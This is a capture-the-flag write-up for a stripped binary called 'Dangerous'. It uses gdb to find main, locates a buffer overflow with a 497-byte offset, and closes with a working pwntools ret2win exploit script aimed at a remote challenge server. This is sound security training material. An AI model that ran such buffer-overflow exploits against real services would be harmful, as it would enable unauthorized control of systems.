# Dangerous

The binary is stripped of symbols, and even radare2 cannot resolve main, so this is a little difficult.

I stepped through in gdb in \_\_libc\_start\_main until the call rax instruction.

At this point, rax was 0x4011d6, indicating to us that this was the address of main. I used x/100i to view all the instructions at this point, and found a small little buffer overflow.

We can use pattern.py to find the offset till the return address is 497.

Looking a little past main, there appears to be another function. It calls open, then read, then puts.

If we do some calculation on RIP and use x/s, we find that it calls open on flag.txt! This must be the flag function.

Essentially, we have a simple ret2win exploit. Overwrite ret address with the flag function.

```python
from pwn import *
NUM_TO_RET = 497
flag =  0x401312
padding = b'A' * NUM_TO_RET
#p = process("./dangerous")
p = remote("jh2i.com", 50011)
p.sendline(flat(padding, flag, word_size=64))
p.interactive()
```

